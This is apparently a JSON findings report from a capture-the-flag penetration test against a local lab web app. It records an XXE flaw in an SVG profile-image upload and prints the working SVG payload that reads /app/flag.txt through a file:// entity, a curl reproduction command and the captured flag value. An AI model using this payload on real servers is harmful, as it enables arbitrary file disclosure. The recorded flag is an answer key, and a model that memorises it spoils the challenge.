@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:45:38.595010+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "e674c3e8-8b37-4b12-8525-ebe8fc3c0bca",
+      "timestamp": "2026-04-12T21:45:38.594910+00:00",
+      "title": "XXE via SVG Profile Image Upload \u2014 Flag Extracted",
+      "severity": "critical",
+      "target": "http://172.17.0.1:46001/",
+      "description": "The profile image upload endpoint accepts SVG files without sanitization. An attacker can embed an XML External Entity (XXE) declaration in the SVG that reads arbitrary files from the server filesystem. The server parses the SVG with a full XML parser, resolves the external entity, and reflects the file contents back in the rendered HTML response.\n\nThe flag file at /app/flag.txt was read using a crafted SVG with a DOCTYPE that declares a file:// external entity.",
+      "evidence": "Uploaded SVG payload:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///app/flag.txt\">]>\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"200\">\n  <text x=\"10\" y=\"100\">&xxe;</text>\n</svg>\n\nServer response reflected:\n<text x=\"10\" y=\"100\">flag{c86ecb0c-4b5c-4151-8fd7-344a76f5cd8f}</text>\n\nFLAG: flag{c86ecb0c-4b5c-4151-8fd7-344a76f5cd8f}",
+      "tool_used": "curl (manual XXE exploit)",
+      "cve": "",
+      "reproduction": {
+        "type": "command",
+        "command": "curl -s -X POST http://172.17.0.1:46001/ -F 'name=test' -F 'surname=test' -F 'address=test' -F 'image=@/tmp/xxe.svg;type=image/svg+xml'",
+        "expected": "Response contains: flag{c86ecb0c-4b5c-4151-8fd7-344a76f5cd8f}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "49f0f47a-b1c0-4a6f-85fa-1347a85fc167",
+      "timestamp": "2026-04-12T21:45:52.223854+00:00",
+      "title": "Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] --> Form[\"POST / (multipart/form-data)\"]\n  Form --> Uvicorn[\"Python Uvicorn Server :46001\"]\n  Uvicorn --> XMLParser[\"XML Parser (lxml/stdlib)\"]\n  XMLParser --> |\"Resolves file:// entities\"|FS[\"Filesystem\"]\n  FS --> FlagFile[\"/app/flag.txt\"]\n  FlagFile --> |\"Entity value injected into SVG\"|Uvicorn\n  Uvicorn --> |\"SVG reflected in HTML response\"|Browser\n  Browser2[\"Browser\"] --> Hint[\"/hint endpoint\"]\n  Hint --> Uvicorn"
+    }
+  ]
+}
